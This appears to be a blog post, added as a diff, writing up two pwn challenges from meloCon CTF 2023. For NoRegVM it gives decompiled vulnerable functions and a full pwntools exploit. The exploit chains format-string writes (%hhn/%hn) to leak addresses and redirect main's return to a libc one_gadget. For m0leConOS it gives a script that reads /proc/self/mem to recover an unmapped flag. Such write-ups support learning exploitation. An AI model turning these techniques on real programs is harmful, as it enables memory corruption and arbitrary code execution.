@@ -1,0 +1,320 @@
+---
+title: "meloCon CTF 2023 Writeup"
+date: "2023-05-16"
+tags: ['Writeup']
+draft: false
+summary: "At meloCon 2023,  I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week."
+---
+
+At meloCon 2023,  I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week.
+
+
+
+## Pwn
+
+### NoRegVM
+
+This challenge provided a binary serves a virtual machine where we can input the program text and memory region on the heap, and the program would interpret the program with our input memory region.
+In the program, we can find several vulnerabilities here:
+
+1. stack overflow in `len` function. Since we could control the memory region, it attempted to copy the contents to the stack buffer. However, this function 1. was safeguarded by a canary 2. doesn't allow copying null bytes.
+
+    ```
+    __int64 __fastcall len(int *a1)
+    {
+      int *v1; // rax
+      int v2; // ecx
+      int v4; // [rsp+14h] [rbp-DCh]
+      int *v5; // [rsp+18h] [rbp-D8h]
+      char s[200]; // [rsp+20h] [rbp-D0h] BYREF
+      unsigned __int64 v7; // [rsp+E8h] [rbp-8h]
+    
+      v7 = __readfsqword(0x28u);
+      v4 = 0;
+      v5 = (int *)((char *)memory + 4 * *a1);
+      while ( *v5 )
+      {
+        v1 = v5++;
+        v2 = *v1;
+        LODWORD(v1) = v4++;
+        s[(int)v1] = v2;       
+      }
+      *((_DWORD *)memory + a1[1]) = strlen(s);
+      return 2LL;
+    }
+    ```
+
+    2. OOR through `pop_out`+`write_buf` on the heap. The program first attempted to copy data from the memory to the global memory named `output` and then print the content of the `output`. We could manipulate the index `a1` and assign it a negative value to make it point to other areas of interest.
+
+        ```
+        __int64 __fastcall pop_out(_DWORD *a1)
+        {
+          int v1; // ecx
+          int v2; // eax
+          int i; // [rsp+14h] [rbp-4h]
+        
+          for ( i = 0; i < a1[1]; ++i )
+          {
+            v1 = *((_DWORD *)memory + *a1 + i);
+            v2 = out_pointer++;
+            output[v2] = v1;
+          }
+          return 2LL;
+        }
+        
+        __int64 __fastcall write_buf(int *a1, const char **a2)
+        {
+          if ( *a1 <= 199 )
+            printf("%s", *a2);
+          return 1LL;
+        }
+        ```
+
+    3. OOW through `pop_in`+`read_buf` on heap, which is quite similar to 2.
+
+    4. fmt vulnerability in `pop_out`. Instead of controlling the array index to determine which heap content was to be copied to the output variable, another OOW existed in the output variable. Notably, a format string was placed in the `.data` segment rather than the `.rodata` segment, suggesting that we could manipulate the format string.
+
+        ![noreg-1](/static/images/melocon-CTF-2023-Writeup/noreg-1.png)
+
+Previously, I didn't identify the fourth vulnerability. However, the second and third vulnerabilities are difficult to exploit because our controlled index will always be left-shifted (`shl`) by 2 bytes when used as an offset. However, only one byte (rather than four bytes) will be copied each time. Even though we could use a divide operation to `shr` 12 bytes by dividing 0x100, this is still unstable since sometimes the address will be viewed as a negative integer(the highest bit is `0x1`) and cause the wrong result.
+
+```
+def leak(index):
+    p = add(0,index,2)
+     
+    for i in range(4):
+        p += pop_out(0,1)
+        p += div(0,0,3) # the third argument in memory region is 0x100
+
+    p += write_buf()
+    p += rst_out()
+
+    return p
+```
+
+Consequently, we decided to exploit the format string vulnerability directly.
+
+With all the mitigation mechanisms in place, our solution will proceed as follows:
+
+```
+Solution:
+    1. leak the elf base address, libc base address and stack address
+    2. use chained fmt exploit to overwrite the return address of main to one_gadget
+    (since we could leak the addr, we don't need to bruteforce)
+        2.1 leverage current rbp (an existing stack pointer) to make the pointer points to the return address of main
+        2.2 leverage our modified stack pointer to overwrite the return address of main
+    
+    if the one_gadget cannot be satisfied, we can use the stack pivot technique to transfer the stack to the memory chunk or output buffer
+```
+
+We're leveraging the `double-stage (chained) fmt` technique once more, previously discussed in detail [here](https://jackfromeast.site/2023-05/ucsd-ctf-2023-writeup.html). However, since we can expose the stack address, there's no need for brute force on this occasion. The central concept behind this approach is to achieve an arbitrary address overwrite; we must have an address pointer that points to that address as the fmt argument. Generally, we have several strategies:
+
+1. **Direct Address Input.** If we can manipulate the fmt arguments buffer and can also expose the address we want to overwrite, we could leverage a library like `fmt_str` to facilitate address overwrite.
+2. **Utilizing the existing address pointer in the fmt arguments buffer.** In certain scenarios, we may not have control over the fmt arguments buffer. For instance, in this case, the fmt string is located on the .data segment (which is controllable), but we cannot write to the stack. In such cases, we can resort to using an existing address pointer. However, most of the time, we might not find the anticipated address pointer.
+3. **Employing the double-stage (chained) fmt technique.** Building on the idea from the second approach, we could initially overwrite an existing address pointer that leads to our desired address. Subsequently, we use the altered address pointer to overwrite the target address.
+
+The final exploit would look like this:
+
+```
+def add(destIndex,n1Index,n2Index):
+    return p32(1) + p32(destIndex) + p32(n1Index) + p32(n2Index)
+                          
+def div(destIndex,dividendIndex,divisorIndex):
+    return p32(4) + p32(destIndex) + p32(dividendIndex) + p32(divisorIndex)
+                          
+def pop_in(startIndex,n):
+    return p32(7) + p32(startIndex) + p32(n)
+                          
+def pop_out(startIndex,n): 
+    return p32(8) + p32(startIndex) + p32(n)
+                                                    
+def read_buf(n):
+    return p32(9) + p32(n) 
+
+def write_buf():
+    return p32(0xa) + p32(0)
+
+def rst_out():
+    return p32(6)
+
+def rst_in():
+    return p32(5)
+
+def leng(startIndex, lengthIndex):
+    return p32(0xD) + p32(startIndex) + p32(lengthIndex)
+
+
+idx = 0
+code = b""
+memory = b""
+
+def fill_output():
+    """
+        output has size 0xCF
+        fmt string - output: 0xD0
+    """
+    global idx, code, memory
+    code += pop_out(0, 0xD0)
+
+
+def read_print_fmt(length=0x20):
+    global idx, code, memory
+
+    fill_output()
+
+    ## read our fmt payload to the buffer
+    code += read_buf(0x20)
+    code += pop_in(idx, 0x20)
+    code += rst_in()
+    ## write the fmt payload to the fmt
+    code += pop_out(idx, 0x20)
+    idx += 0x20
+    code += write_buf()
+    # reset output_pointer to 0xD0
+    code += rst_out()
+
+
+def save_code_memory():
+    global idx, code, memory
+
+    for _ in range(6):
+        read_print_fmt()
+
+    save_file()
+
+def _log_payload(fmt_payload):
+    log.info("fmt payload: %s" % fmt_payload)
+    log.info("packed fmt payload length: %s" % hex(len(fmt_payload)))
+
+
+def exploit():
+    sh = start()
+
+    ## leak the elf loading address and libc base address
+    ## 9th argument 0x555555555964 -> loop+438
+    ## 45th argument 0x7fffffffdd80 dce0 -> __libc_start_main+133
+    fmt_payload = b"%6$p-%9$p-%45$pEND"
+    _log_payload(fmt_payload)
+    sh.sendline(fmt_payload)
+
+    raw_leaked = sh.recvuntil(b"END")[:-3].split(b"-")
+    stack_addr = get_leaked_addr(raw_leaked[0], 0)
+    loop_addr = get_leaked_addr(raw_leaked[1], 0) - 438
+    libc_start_main_addr = get_leaked_addr(raw_leaked[2], 0) - 133
+
+    elf_loading_addr = loop_addr - binary.symbols['loop']
+    libcbase, _, _ = get_libcbase(libc_start_main_addr, '__libc_start_main')
+    stack_main_ret_addr = stack_addr + 0x60
+
+    log.info("elf loading address: %s" % hex(elf_loading_addr))
+    log.info("libc base address: %s" % hex(libcbase))
+    log.info("main ret stack address: %s" % hex(stack_main_ret_addr))
+
+    one_gadget = libcbase + 0xf25ea
+    log.info("one gadget address: %s" % hex(one_gadget))
+    
+    ### First stage
+    ### leverage the current rbp (8th argument) to overwrite the next rbp (16th argument) points to the return address of main +2 
+    fmt_payload = f"%{(stack_main_ret_addr&0xff)+0x2}c%8$hhn"
+    _log_payload(fmt_payload)
+    sh.sendline(fmt_payload)
+
+    ### leverage the next rbp (16th argument) to overwrite the return address of main's last 3-4 bytes
+    fmt_payload = f"%{(one_gadget>>16)&0xffff}c%16$hn"
+    _log_payload(fmt_payload)
+    sh.recvuntil(b"\n")
+    sh.sendline(fmt_payload)
+
+    ### Second stage
+    ### leverage the current rbp (8th argument) to overwrite the next rbp (16th argument) points to the return address of main
+    fmt_payload = f"%{stack_main_ret_addr&0xff}c%8$hhn"
+    _log_payload(fmt_payload)
+    sh.recvuntil(b"\n")
+    sh.sendline(fmt_payload)
+
+    ### leverage the next rbp (16th argument) to overwrite the return address of main's last 2 bytes
+    fmt_payload = f"%{one_gadget&0xffff}c%16$hn"
+    _log_payload(fmt_payload)
+    sh.recvuntil(b"\n")
+    sh.sendline(fmt_payload)
+
+    ### Final stage
+    ### restrore the rbp to the original value so the stack won't be corrupted
+    fmt_payload = f"%{(stack_main_ret_addr&0xff)-0x8}c%8$hhn"
+    _log_payload(fmt_payload)
+    sh.recvuntil(b"\n")
+    sh.sendline(fmt_payload)
+
+    sh.interactive()
+    
+def save_file():
+    global idx, code, memory
+    with open("solve-program.vm","wb") as p:
+        p.write(code)
+
+    with open("solve-memory.vm","wb") as m:
+        m.write(memory)
+
+if __name__ == "__main__":
+    save_code_memory()
+    exploit()
+```
+
+### m0leConOS
+
+We made an unintended way to solve this challenge. Specifically, we try to print out the `/proc/self/mem` content after the flag has been read to the segment. Even though the binary will `unmmap` the segment after reading, we still could read the content through `/proc/self/mem` as the operation will not clear out the saved content.
+
+```
+sh = start()
+
+def m0lecat(fn):
+    sh.sendline(b"m0lecat")
+    sh.recvuntil(b"> ")
+    sh.sendline(fn)
+    sh.sendline()
+    
+    while True:
+        log.info("Receiving...")
+        content = sh.recv(1024, timeout=1)
+
+        # find the index of "ptm"
+        index = content.find(b"ptm")
+
+        # if "ptm" is found, print the bytes after it
+        if index != -1:
+            log.info(content[index:index+40])
+            break
+
+    return content
+
+def m0lecat1(fn):
+    sh.sendline(b"m0lecat")
+    sh.recvuntil(b"> ")
+    sh.sendline(fn)
+    sh.sendline()
+    sh.sendline()
+
+    content = sh.recvuntil(b"\x1B[1;")
+
+    return content
+
+def touch(fn, val):
+    sh.recvuntil(b"# ")
+    sh.sendline(b"touch")
+    sh.recvuntil(b"Filename: ")
+    sh.sendline(fn)
+    sh.recvuntil(b"> ")
+    sh.sendline(val)
+    sh.recvuntil(b"Ok your file has been created!")
+
+def exploit():
+    sh.recvuntil(b"# ")
+    m0lecat1(b"flag.txt")
+    sh.recvuntil(b"# ")
+    m0lecat(b"/proc/self/mem")
+
+if __name__ == "__main__":
+    exploit()
+```
+
+![m0leConOS-1](/static/images/melocon-CTF-2023-Writeup/m0leConOS-1.png)
